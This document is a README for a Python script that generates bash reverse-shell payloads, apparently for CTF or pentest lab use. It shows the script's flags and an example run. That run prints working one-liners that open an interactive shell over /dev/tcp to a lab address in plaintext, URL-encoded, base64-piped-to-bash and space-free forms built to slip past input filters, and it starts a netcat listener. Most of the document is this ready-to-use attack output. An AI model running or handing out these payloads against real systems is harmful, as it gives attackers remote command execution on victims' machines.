# Simple generator reverse shell for bash

**Description**

Simple generator reverse shell payload for bash in python

Usage:
```
$ ./genRevShell.py [flags]
```
Flags:
```
-a, --addr    Address for reverse connect
-p, --port    Port for reverse connect, 9001 by default
-r            Run the netcat on localhost
```
Example:
```
$ ./genRevShell.py -a 10.10.14.128 -r
```
Output:
```
[*] Input address is 10.10.14.128
[*] Input port is 9001

[1] The bash payload in plaintext:

bash  -c 'bash -i >& /dev/tcp/10.10.14.128/9001 0>&1'

[2] The bash payload in URL(plaintext):

bash%20%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.128%2F9001%200%3E%261%27

[3] The bash payload in Base64():

echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI4LzkwMDEgMD4mMSc=|base64 -d|bash -i

[4] The bash payload in URL(Base64()):

echo%20YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI4LzkwMDEgMD4mMSc%3D%7Cbase64%20-d%7Cbash%20-i

[5] The bash payload in Base64() with no spaces:

{echo,YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI4LzkwMDEgMD4mMSc=}|{base64,-d}|{bash,-i}

[6] The bash payload in URL(Base64()) with no spaces:

%7Becho%2CYmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI4LzkwMDEgMD4mMSc%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D

[+] Run the netcat on localhost on 9001:

Listening on 0.0.0.0 9001
```
My favorite choice is **[3]** payload :)
